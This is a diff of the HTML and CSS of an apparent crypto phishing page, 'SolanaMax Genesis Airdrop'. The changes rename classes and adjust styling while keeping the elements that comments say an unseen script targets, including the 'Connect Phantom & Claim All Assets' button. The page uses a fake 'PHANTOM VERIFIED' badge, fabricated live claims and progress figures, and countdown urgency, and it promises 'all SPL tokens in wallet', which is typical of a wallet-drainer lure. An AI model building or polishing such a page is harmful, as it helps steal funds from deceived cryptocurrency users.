@@ -5,12 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
     <title>SolanaMax · Genesis Airdrop | Claim SMAX & SPL Tokens</title>
     <meta name="description" content="Official Solana ecosystem airdrop. Claim SMAX and SPL tokens." />
-    <meta name="keywords" content="SolanaMax, airdrop, free tokens, cryptocurrency, Solana, claim tokens" />
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-    <link rel="stylesheet" href="styles.css" /> <!-- keep your existing Solana styles? Actually we'll inline the CSS below -->
     <style>
-        /* ===== Full premium TRX-based CSS with Solana purple ===== */
+        /* ====== Full TRX-based CSS with Solana purple ====== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         html, body {
@@ -66,7 +64,7 @@
             overflow: hidden;
             max-width: 100vw;
         }
-        .solana-background .grid {
+        .solana-background .solana-grid {
             position: absolute;
             width: 100%;
             height: 100%;
@@ -75,13 +73,13 @@
                 repeating-linear-gradient(0deg, transparent, transparent 59px, rgba(153,69,255,0.02) 59px, rgba(153,69,255,0.02) 60px),
                 repeating-linear-gradient(90deg, transparent, transparent 59px, rgba(153,69,255,0.02) 59px, rgba(153,69,255,0.02) 60px);
         }
-        .solana-background .glow {
+        .solana-background .solana-glow {
             position: absolute;
             border-radius: 50%;
             filter: blur(100px);
             opacity: 0.4;
         }
-        .solana-background .glow-1 {
+        .solana-background .solana-glow-1 {
             width: 900px;
             height: 900px;
             background: radial-gradient(circle, rgba(var(--solana-purple-rgb),0.06) 0%, transparent 70%);
@@ -89,7 +87,7 @@
             right: -250px;
             animation: slowFloat 25s infinite ease-in-out;
         }
-        .solana-background .glow-2 {
+        .solana-background .solana-glow-2 {
             width: 700px;
             height: 700px;
             background: radial-gradient(circle, rgba(var(--solana-purple-rgb),0.04) 0%, transparent 70%);
@@ -133,20 +131,21 @@
             font-size: 0.75rem;
             color: var(--text-secondary);
         }
-        .network-bar .left, .network-bar .right {
+        .network-bar .network-left, .network-bar .network-right {
             display: flex;
             gap: 24px;
             align-items: center;
             flex-wrap: wrap;
         }
-        .network-bar .stat {
+        .network-bar .network-stat {
             display: flex;
             align-items: center;
             gap: 6px;
         }
-        .network-bar .stat i { color: var(--solana-purple-light); font-size: 0.6rem; }
-        .network-bar .stat .val { color: var(--text-primary); font-weight: 600; }
-        .network-bar .badge {
+        .network-bar .network-stat i { color: var(--solana-purple-light); font-size: 0.6rem; }
+        .network-bar .network-stat .value { color: var(--text-primary); font-weight: 600; }
+        .network-bar .change-positive { color: var(--success); font-size: 0.65rem; margin-left: 3px; }
+        .network-bar .solana-badge {
             background: rgba(var(--solana-purple-rgb),0.1);
             border: 1px solid rgba(var(--solana-purple-rgb),0.2);
             color: var(--solana-purple-light);
@@ -159,8 +158,8 @@
             white-space: nowrap;
         }
 
-        /* Main Container – use .container for script compatibility */
-        .container {
+        /* Main Container */
+        .main-container {
             max-width: 1180px;
             width: 100%;
             margin: 0 auto;
@@ -195,9 +194,8 @@
             justify-content: center;
             box-shadow: var(--glow-purple);
             flex-shrink: 0;
-            font-weight: 800;
             color: #fff;
-            font-size: 1.5rem;
+            font-size: 1.8rem;
         }
         .solana-logo-text {
             font-family: 'Plus Jakarta Sans', sans-serif;
@@ -310,7 +308,7 @@
         }
         .contract-badge code { color: var(--solana-purple-light); font-family: monospace; font-size: 0.7rem; }
 
-        /* Token Card (contains .airdrop-amount) */
+        /* Token Card – contains script‑targeted .airdrop-amount */
         .solana-token-card {
             background: linear-gradient(135deg, #13161F 0%, #0A0B0F 100%);
             border: 1px solid var(--border-color);
@@ -331,11 +329,9 @@
             align-items: center;
             justify-content: center;
             margin: 0 auto 18px;
-            position: relative;
-            z-index: 1;
             box-shadow: var(--glow-purple);
-            font-size: 2.5rem;
             color: #fff;
+            font-size: 2.5rem;
         }
         .token-label {
             font-size: 0.75rem;
@@ -343,11 +339,13 @@
             text-transform: uppercase;
             letter-spacing: 2px;
             margin-bottom: 10px;
+        }
+        .token-amount-wrapper {
             position: relative;
             z-index: 1;
         }
-        .token-amount-wrapper { position: relative; z-index: 1; }
-        .airdrop-amount { /* original class used by script */
+        /* Script updates this element */
+        .airdrop-amount {
             font-family: 'Plus Jakarta Sans', sans-serif;
             font-size: clamp(2.5rem, 8vw, 3.4rem);
             font-weight: 800;
@@ -374,8 +372,6 @@
             padding: 6px 16px;
             border-radius: 20px;
             border: 1px solid rgba(var(--solana-purple-rgb),0.1);
-            position: relative;
-            z-index: 1;
         }
         .token-info {
             font-size: 0.7rem;
@@ -477,7 +473,6 @@
             background: linear-gradient(90deg, var(--solana-purple), var(--solana-purple-light));
             width: 0;
             border-radius: 3px;
-            position: relative;
             box-shadow: 0 0 15px rgba(var(--solana-purple-rgb),0.4);
         }
         .progress-stats-row {
@@ -487,7 +482,7 @@
             color: var(--text-tertiary);
         }
 
-        /* Countdown (original .countdown) */
+        /* Countdown – script uses .countdown */
         .solana-countdown {
             background: linear-gradient(135deg, #13161F 0%, #0A0B0F 100%);
             border: 1px solid var(--border-color);
@@ -541,7 +536,7 @@
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        /* original .countdown (if script updates it) */
+        /* Script updates this element */
         .countdown {
             font-size: 0.9rem;
             color: var(--solana-purple-light);
@@ -551,6 +546,7 @@
             padding: 4px 16px;
             border-radius: 20px;
             border: 1px solid rgba(153,69,255,0.15);
+            margin-top: 12px;
         }
 
         /* Claim Button – must be #connect-wallet */
@@ -593,7 +589,6 @@
         }
         #connect-wallet:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* Wallet icons (optional) */
         .wallet-icons {
             display: flex;
             justify-content: center;
@@ -619,7 +614,7 @@
             color: var(--solana-purple-light);
         }
 
-        /* Success message (hidden) */
+        /* Success Message */
         .solana-success-message {
             background: linear-gradient(135deg, #0A1F14 0%, #07170E 100%);
             border: 1px solid var(--success);
@@ -734,7 +729,7 @@
             display: block;
         }
 
-        /* Features – original .features */
+        /* Features – original .features (script may update) */
         .features {
             display: flex;
             justify-content: space-around;
@@ -861,7 +856,7 @@
 
         @media (max-width: 768px) {
             .network-bar { flex-direction: column; align-items: stretch; gap: 6px; }
-            .network-bar .left, .network-bar .right { justify-content: center; }
+            .network-bar .network-left, .network-bar .network-right { justify-content: center; }
             .features { flex-direction: column; gap: 15px; }
         }
     </style>
@@ -870,30 +865,31 @@
 
     <!-- Background -->
     <div class="solana-background">
-        <div class="grid"></div>
-        <div class="glow glow-1"></div>
-        <div class="glow glow-2"></div>
+        <div class="solana-grid"></div>
+        <div class="solana-glow solana-glow-1"></div>
+        <div class="solana-glow solana-glow-2"></div>
     </div>
 
     <!-- Network Bar -->
     <div class="network-bar">
-        <div class="left">
-            <span class="stat"><i class="fas fa-circle" style="color:#22C55E;"></i> SOL: <span class="val" id="solPrice">$145.20</span> <span style="color:#22C55E;font-size:0.65rem;">▲2.3%</span></span>
-            <span class="stat"><i class="fas fa-cube"></i> Slot: <span class="val" id="blockHeight">198,453,276</span></span>
-            <span class="stat"><i class="fas fa-gas-pump"></i> Fee: <span class="val">~0.000005 SOL</span></span>
+        <div class="network-left">
+            <div class="network-stat"><i class="fas fa-circle" style="color: #22C55E;"></i> SOL: <span class="value" id="solPrice">$145.20</span><span id="solChange" class="change-positive">▲2.3%</span></div>
+            <div class="network-stat"><i class="fas fa-cube"></i> Slot: <span class="value" id="blockHeight">198,453,276</span></div>
+            <div class="network-stat"><i class="fas fa-gas-pump"></i> Fee: <span class="value">~0.000005 SOL</span></div>
         </div>
-        <div class="right">
-            <span class="stat"><i class="fas fa-link"></i> Chain: <span class="val">Solana Mainnet</span></span>
-            <span class="badge"><i class="fas fa-check-circle"></i> SPL Network</span>
+        <div class="network-right">
+            <div class="network-stat"><i class="fas fa-link"></i> Chain: <span class="value">Solana Mainnet</span></div>
+            <div class="solana-badge"><i class="fas fa-check-circle"></i> SPL Network</div>
         </div>
     </div>
 
-    <!-- Main Container – using .container for script -->
-    <div class="container">
+    <!-- Main Container -->
+    <div class="main-container">
+
         <!-- Header -->
         <header class="solana-header">
             <div class="logo-area">
-                <div class="solana-logo">SM</div>
+                <div class="solana-logo"><i class="fas fa-circle"></i></div>
                 <div class="solana-logo-text">Solana<span>Max</span></div>
                 <div class="verified-pill"><i class="fas fa-shield"></i>PHANTOM VERIFIED</div>
             </div>
@@ -901,13 +897,14 @@
 
         <!-- Hero -->
         <section class="hero-section">
-            <div class="hero-badge"><i class="fas fa-gift" style="margin-right:6px;"></i>GENESIS AIRDROP · SPL NETWORK</div>
+            <div class="hero-badge"><i class="fas fa-gift"></i> GENESIS AIRDROP · SPL NETWORK</div>
             <h1>Claim Your <span class="solana-highlight">Solana</span><br />Ecosystem Airdrop</h1>
             <p class="hero-subtitle">Official distribution for Solana users. 500 SMAX allocation + all SPL tokens per eligible wallet.</p>
         </section>
 
         <!-- Content Grid -->
         <div class="content-grid">
+
             <!-- Claim Card -->
             <div class="claim-card">
                 <div class="card-header">
@@ -915,22 +912,23 @@
                     <div class="contract-badge"><i class="fas fa-file-contract" style="color:#9945FF;"></i><code>So1...pL9</code></div>
                 </div>
 
-                <!-- Token Display – includes .airdrop-amount -->
+                <!-- Token Display – script updates .airdrop-amount -->
                 <div class="solana-token-card">
                     <div class="solana-icon-large"><i class="fas fa-circle"></i></div>
                     <div class="token-label">Your Eligible Allocation</div>
                     <div class="token-amount-wrapper">
+                        <!-- 👇 script targets this class -->
                         <span class="airdrop-amount" id="airdropAmount">500</span>
                         <span class="token-symbol">SMAX</span>
                     </div>
                     <div class="token-value" id="usdValue">≈ $72.50 USD</div>
                     <div class="token-info">+ All SPL tokens in wallet (USDC, USDT, mSOL, JUP, RAY)</div>
-                    <div class="price-source"><i class="fas fa-circle"></i><span>Live price via CoinGecko</span></div>
+                    <div class="price-source"><i class="fas fa-circle"></i> Live price via CoinGecko</div>
                 </div>
 
-                <!-- Live Ticker (extra, not required by script) -->
+                <!-- Live Ticker -->
                 <div class="live-ticker">
-                    <div class="ticker-header"><i class="fas fa-circle"></i><span>Live Claims</span></div>
+                    <div class="ticker-header"><i class="fas fa-circle"></i> Live Claims</div>
                     <div class="ticker-content">
                         <div class="ticker-item"><i class="fas fa-check-circle" style="color:#22C55E;font-size:0.6rem;"></i> <code>7xK...pL9</code> claimed 500 SMAX + USDC · 5s ago</div>
                         <div class="ticker-item" style="animation-delay:2s;"><i class="fas fa-check-circle" style="color:#22C55E;font-size:0.6rem;"></i> <code>G9f...kLmN</code> claimed 500 SMAX + mSOL · 28s ago</div>
@@ -939,14 +937,14 @@
                     </div>
                 </div>
 
-                <!-- Progress (extra) -->
+                <!-- Progress -->
                 <div class="solana-progress-section">
                     <div class="progress-header-row"><span class="progress-label">Distribution Progress</span><span class="progress-percent">61%</span></div>
                     <div class="progress-bar-bg"><div class="progress-bar-fill" style="width:61%"></div></div>
                     <div class="progress-stats-row"><span>30,500,000 SMAX</span><span>50,000,000 SMAX Total</span></div>
                 </div>
 
-                <!-- Countdown – includes original .countdown class -->
+                <!-- Countdown – script updates .countdown -->
                 <div class="solana-countdown">
                     <div class="countdown-title"><i class="fas fa-hourglass-half"></i><h3>Airdrop Ends</h3><span class="block-info">≈ 85,000 blocks</span></div>
                     <div class="countdown-display">
@@ -955,11 +953,11 @@
                         <div class="countdown-block"><div class="countdown-number" id="solanaMinutes">22</div><div class="countdown-unit">Mins</div></div>
                         <div class="countdown-block"><div class="countdown-number" id="solanaSeconds">45</div><div class="countdown-unit">Secs</div></div>
                     </div>
-                    <!-- original .countdown for script updates (hidden) -->
-                    <div class="countdown" style="display:none;">⏰ Limited Time: 48 hours remaining</div>
+                    <!-- 👇 script updates this element -->
+                    <div class="countdown">⏰ Limited Time: 48 hours remaining</div>
                 </div>
 
-                <!-- Claim Button – id="connect-wallet" -->
+                <!-- Claim Button – script uses #connect-wallet -->
                 <div class="claim-button-container">
                     <button id="connect-wallet"><i class="fas fa-wallet"></i> Connect Phantom & Claim All Assets</button>
                 </div>
@@ -970,7 +968,7 @@
                     <div class="wallet-icon"><i class="fas fa-mobile-alt"></i></div>
                 </div>
 
-                <!-- Success Message (hidden) -->
+                <!-- Success Message -->
                 <div id="solanaSuccessMessage" class="solana-success-message" style="display:none;">
                     <i class="fas fa-check-circle" style="font-size:3rem; color:#22C55E;"></i>
                     <div style="font-size:1.3rem;font-weight:700;color:#22C55E;margin-bottom:8px;">Claim Successful</div>
@@ -1023,7 +1021,7 @@
 
         <!-- Warning – original .warning -->
         <div class="warning">
-            ⚠️ Claim Offer Now Before Its Too Late
+            ⚠️ Claim Offer Now Before It's Too Late
         </div>
 
         <!-- Trust Stats -->
